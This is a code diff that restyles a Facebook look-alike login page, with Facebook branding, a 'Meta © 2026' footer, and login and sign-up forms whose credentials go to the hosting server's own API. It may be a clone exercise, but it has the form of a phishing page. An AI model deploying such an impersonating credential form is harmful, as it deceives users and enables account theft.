@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Facebook</title>
     <style>
         * {
@@ -17,83 +17,66 @@
             min-height: 100vh;
         }
 
-        /* Mobile First Design */
-        .container {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+        /* Main container */
+        .main {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px 16px;
         }
 
-        /* Header / Logo Section */
-        .hero {
-            background: white;
-            padding: 40px 20px 30px;
+        /* Logo section */
+        .logo-section {
             text-align: center;
-            border-bottom: 1px solid #dadde1;
+            padding: 40px 0 30px;
         }
 
-        .logo {
-            font-size: 48px;
+        .fb-logo {
+            font-size: 64px;
             font-weight: 700;
             color: #1877f2;
-            margin-bottom: 16px;
+            letter-spacing: -1px;
         }
 
-        .tagline {
-            font-size: 20px;
-            color: #1c1e21;
-            line-height: 28px;
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        /* Login Card */
-        .login-card {
+        /* Login form */
+        .form-container {
             background: white;
-            margin: 20px;
-            padding: 20px;
-            border-radius: 12px;
+            border-radius: 16px;
+            padding: 20px 16px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
         }
 
         .input-field {
             width: 100%;
-            padding: 14px 16px;
+            padding: 16px;
             font-size: 16px;
             border: 1px solid #dddfe2;
             border-radius: 8px;
             margin-bottom: 12px;
             background: #ffffff;
             -webkit-appearance: none;
-            appearance: none;
         }
 
         .input-field:focus {
             outline: none;
             border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
 
         .login-btn {
+            width: 100%;
+            padding: 16px;
             background: #1877f2;
+            color: white;
             border: none;
             border-radius: 8px;
             font-size: 18px;
             font-weight: 600;
-            padding: 14px;
-            width: 100%;
-            color: white;
             cursor: pointer;
             margin-bottom: 16px;
-            transition: background 0.2s;
         }
 
         .login-btn:hover {
-            background: #1666d1;
-        }
-
-        .login-btn:active {
-            background: #0e5ed7;
+            background: #1663c7;
         }
 
         .forgot-link {
@@ -105,40 +88,99 @@
             color: #1877f2;
             font-size: 14px;
             text-decoration: none;
-            cursor: pointer;
         }
 
-        .forgot-link a:hover {
-            text-decoration: underline;
-        }
-
-        hr {
+        .divider {
             border: none;
             border-top: 1px solid #dadde1;
             margin: 20px 0;
         }
 
         .create-btn {
+            width: 100%;
+            padding: 16px;
             background: #42b72a;
+            color: white;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             font-weight: 600;
-            padding: 14px;
-            width: 100%;
-            color: white;
             cursor: pointer;
-            transition: background 0.2s;
         }
 
         .create-btn:hover {
             background: #36a420;
         }
 
-        .create-btn:active {
-            background: #2d8f1a;
+        /* Welcome view */
+        .welcome-card {
+            background: white;
+            border-radius: 16px;
+            padding: 40px 20px;
+            text-align: center;
         }
 
+        .welcome-name {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin: 20px 0;
+        }
+
+        .logout-btn {
+            width: 100%;
+            padding: 14px;
+            background: #e41e3f;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .modal-header {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .close-modal {
+            float: right;
+            font-size: 28px;
+            cursor: pointer;
+            color: #65676b;
+        }
+
+        /* Message */
         .message {
             margin-top: 16px;
             padding: 12px;
@@ -160,215 +202,103 @@
             display: block;
         }
 
-        /* Welcome View */
-        .welcome-card {
-            text-align: center;
-            padding: 30px 20px;
-        }
-
-        .welcome-logo {
-            font-size: 48px;
-            font-weight: 700;
-            color: #1877f2;
-            margin-bottom: 30px;
-        }
-
-        .welcome-name {
-            font-size: 24px;
-            font-weight: 600;
-            color: #1c1e21;
-            margin: 20px 0;
-            word-break: break-word;
-        }
-
-        .welcome-message {
-            color: #65676b;
-            margin-bottom: 30px;
-        }
-
-        .logout-btn {
-            background: #e41e3f;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            padding: 14px 24px;
-            color: white;
-            cursor: pointer;
-            width: 100%;
-            max-width: 200px;
-            margin: 0 auto;
-            transition: background 0.2s;
-        }
-
-        /* Modal */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal.active {
-            display: flex;
-        }
-
-        .modal-content {
-            background: white;
-            border-radius: 12px;
-            width: 90%;
-            max-width: 432px;
-            max-height: 90vh;
-            overflow-y: auto;
-            padding: 20px;
-        }
-
-        .modal-header {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 16px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #dadde1;
-        }
-
-        .modal-close {
-            float: right;
-            font-size: 28px;
-            cursor: pointer;
-            color: #65676b;
-        }
-
-        .modal-close:hover {
-            color: #1c1e21;
-        }
-
+        /* Footer */
         .footer {
             text-align: center;
-            padding: 20px;
+            padding: 30px 20px 20px;
             color: #737373;
             font-size: 12px;
-            margin-top: auto;
         }
 
-        /* Desktop styles */
-        @media (min-width: 900px) {
-            .container {
-                display: flex;
-                flex-direction: row;
-                justify-content: center;
-                align-items: center;
-                min-height: 100vh;
-                max-width: 980px;
-                margin: 0 auto;
-                padding: 20px;
-            }
-
-            .hero {
-                background: transparent;
-                text-align: left;
-                padding: 0;
-                border-bottom: none;
-                flex: 1;
-                margin-right: 40px;
-            }
-
-            .logo {
-                font-size: 55px;
-                text-align: left;
-            }
-
-            .tagline {
-                font-size: 28px;
-                line-height: 32px;
-                margin: 0;
-            }
-
-            .login-card {
-                margin: 0;
-                width: 396px;
-                flex-shrink: 0;
-            }
-
-            .footer {
-                position: fixed;
-                bottom: 0;
-                width: 100%;
-                background: white;
-            }
+        .footer-links {
+            margin-bottom: 10px;
         }
 
-        /* Loading state */
-        .loading {
-            opacity: 0.7;
-            pointer-events: none;
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 8px;
+            font-size: 12px;
+        }
+
+        /* Desktop adjustments */
+        @media (min-width: 768px) {
+            .main {
+                max-width: 400px;
+                padding: 40px 16px;
+            }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="hero">
-        <div class="logo">facebook</div>
-        <div class="tagline">Connect with friends and the world around you on Facebook.</div>
+<div class="main">
+    <!-- Logo -->
+    <div class="logo-section">
+        <div class="fb-logo">f</div>
     </div>
 
-    <div class="login-card">
-        <div id="loginView">
-            <input type="email" id="loginEmail" class="input-field" placeholder="Email address or phone number" autocomplete="email">
-            <input type="password" id="loginPassword" class="input-field" placeholder="Password" autocomplete="current-password">
-            <button class="login-btn" id="loginBtn">Log In</button>
+    <!-- Login Form -->
+    <div id="loginFormContainer">
+        <div class="form-container">
+            <input type="text" id="loginEmail" class="input-field" placeholder="Mobile number or email address">
+            <input type="password" id="loginPassword" class="input-field" placeholder="Password">
+            <button class="login-btn" id="loginBtn">Log in</button>
             <div class="forgot-link"><a id="forgotBtn">Forgotten password?</a></div>
-            <hr>
+            <div class="divider"></div>
             <button class="create-btn" id="showCreateBtn">Create new account</button>
         </div>
-
-        <div id="welcomeView" style="display: none;">
-            <div class="welcome-card">
-                <div class="welcome-logo">facebook</div>
-                <div class="welcome-name" id="welcomeName"></div>
-                <div class="welcome-message">You're now logged in!</div>
-                <button class="logout-btn" id="logoutBtn">Log Out</button>
-            </div>
-        </div>
-
-        <div id="messageDiv" class="message"></div>
     </div>
-</div>
 
-<div class="footer">
-    <span>Meta © 2026</span>
+    <!-- Welcome View (hidden initially) -->
+    <div id="welcomeContainer" style="display: none;">
+        <div class="welcome-card">
+            <div class="fb-logo" style="font-size: 48px;">f</div>
+            <div class="welcome-name" id="welcomeName"></div>
+            <button class="logout-btn" id="logoutBtn">Log out</button>
+        </div>
+    </div>
+
+    <!-- Message -->
+    <div id="messageDiv" class="message"></div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">English (UK)</a>
+            <a href="#">About</a>
+            <a href="#">Help</a>
+            <a href="#">More</a>
+        </div>
+        <div>Meta © 2026</div>
+    </div>
 </div>
 
 <!-- Register Modal -->
 <div id="registerModal" class="modal">
     <div class="modal-content">
-        <span class="modal-close" id="closeModalBtn">&times;</span>
-        <div class="modal-header">Sign Up</div>
-        <input type="text" id="regName" class="input-field" placeholder="Full name" autocomplete="name">
-        <input type="email" id="regEmail" class="input-field" placeholder="Email address" autocomplete="email">
-        <input type="password" id="regPassword" class="input-field" placeholder="New password" autocomplete="new-password">
-        <div id="regError" class="message error" style="display: none;"></div>
-        <button class="login-btn" id="registerBtn" style="margin-top: 10px;">Sign Up</button>
+        <span class="close-modal" id="closeModalBtn">&times;</span>
+        <div class="modal-header">Create new account</div>
+        <input type="text" id="regName" class="input-field" placeholder="Full name">
+        <input type="email" id="regEmail" class="input-field" placeholder="Email address">
+        <input type="password" id="regPassword" class="input-field" placeholder="Password">
+        <div id="regError" style="color: #e41e3f; font-size: 13px; margin-bottom: 12px; display: none;"></div>
+        <button class="login-btn" id="registerBtn" style="background: #42b72a; margin-bottom: 0;">Sign Up</button>
     </div>
 </div>
 
 <script>
     const API_URL = window.location.origin + '/api';
-    
-    // DOM Elements
-    const loginView = document.getElementById('loginView');
-    const welcomeView = document.getElementById('welcomeView');
+
+    // Elements
+    const loginFormContainer = document.getElementById('loginFormContainer');
+    const welcomeContainer = document.getElementById('welcomeContainer');
     const loginEmail = document.getElementById('loginEmail');
     const loginPassword = document.getElementById('loginPassword');
     const loginBtn = document.getElementById('loginBtn');
     const logoutBtn = document.getElementById('logoutBtn');
     const showCreateBtn = document.getElementById('showCreateBtn');
+    const forgotBtn = document.getElementById('forgotBtn');
     const registerModal = document.getElementById('registerModal');
     const closeModalBtn = document.getElementById('closeModalBtn');
     const registerBtn = document.getElementById('registerBtn');
@@ -378,7 +308,6 @@
     const regError = document.getElementById('regError');
     const messageDiv = document.getElementById('messageDiv');
     const welcomeName = document.getElementById('welcomeName');
-    const forgotBtn = document.getElementById('forgotBtn');
 
     function showMessage(msg, type) {
         messageDiv.textContent = msg;
@@ -432,7 +361,7 @@
         } catch (error) {
             showMessage('Network error: ' + error.message, 'error');
         } finally {
-            loginBtn.textContent = 'Log In';
+            loginBtn.textContent = 'Log in';
             loginBtn.disabled = false;
         }
     }
@@ -484,25 +413,25 @@
     }
 
     function showWelcome(user) {
-        loginView.style.display = 'none';
-        welcomeView.style.display = 'block';
+        loginFormContainer.style.display = 'none';
+        welcomeContainer.style.display = 'block';
         welcomeName.textContent = user.name;
     }
 
     function handleLogout() {
         localStorage.removeItem('fb_user');
-        loginView.style.display = 'block';
-        welcomeView.style.display = 'none';
+        loginFormContainer.style.display = 'block';
+        welcomeContainer.style.display = 'none';
         loginEmail.value = '';
         loginPassword.value = '';
         showMessage('Logged out successfully', 'success');
     }
 
     function handleForgot() {
-        showMessage('Password reset link will be sent to your email.', 'success');
+        showMessage('Password reset link sent to your email.', 'success');
     }
 
-    // Event Listeners
+    // Event listeners
     loginBtn.addEventListener('click', handleLogin);
     logoutBtn.addEventListener('click', handleLogout);
     showCreateBtn.addEventListener('click', showRegisterModal);
@@ -518,7 +447,7 @@
         if (e.key === 'Enter') handleLogin();
     });
 
-    // Close modal when clicking outside
+    // Close modal on outside click
     window.addEventListener('click', (e) => {
         if (e.target === registerModal) {
             closeRegisterModal();
